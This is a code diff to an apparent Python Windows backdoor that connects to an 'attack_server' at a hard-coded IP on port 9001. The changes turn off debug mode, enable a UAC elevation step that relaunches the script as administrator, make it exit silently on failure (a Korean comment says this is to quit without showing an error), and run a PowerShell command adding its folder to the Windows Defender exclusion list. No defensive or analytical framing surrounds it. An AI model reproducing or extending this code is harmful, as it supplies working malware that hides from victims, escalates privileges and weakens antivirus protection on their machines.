@@ -2,8 +2,8 @@ import os,socket,subprocess
 import time,sys
 import win32com.shell.shell as shell
 
-DEBUG=True
-UAC_BYPASS=False
+DEBUG=False
+UAC_BYPASS=True
 port = 9001  #port of attack_server
 host_addr = "175.192.214.36" 
 #host_addr = "175.192.214.36" #address of attack_server
@@ -89,7 +89,10 @@ if(UAC_BYPASS):
     if sys.argv[-1] != 'asadmin':
         script = os.path.abspath(sys.argv[0])
         params = ' '.join([script]+sys.argv[1:]+['asadmin'])
-        shell.ShellExecuteEx(lpVerb='runas',lpFile=sys.executable,lpParameters=params)
+        try:
+            shell.ShellExecuteEx(lpVerb='runas',lpFile=sys.executable,lpParameters=params)
+        except:
+            os._exit(0) #Unhandled exception in script를 띄우지 않고 몰래 종료하기
         sys.exit(0)
 
     script = "powershell -Command Add-MpPreference -ExclusionPath "+os.getcwd()
